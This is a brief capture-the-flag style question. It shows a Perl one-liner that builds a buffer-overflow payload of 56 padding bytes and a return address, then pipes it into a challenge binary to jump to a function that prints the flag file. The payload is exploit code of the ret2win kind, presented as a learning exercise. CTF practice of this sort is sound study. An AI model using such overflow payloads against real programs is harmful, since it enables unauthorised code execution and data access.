perl -e 'print "\x00"x56;print "\x86\x11\x40\x00\x00\x00\x00\x00"'>out.txt
cat out.txt|./carlyraejepsen
In this question, I'm trying to bufferoverflow to overwrite the return address, then after the main ends it will jump to flag function to execute cat flag.txt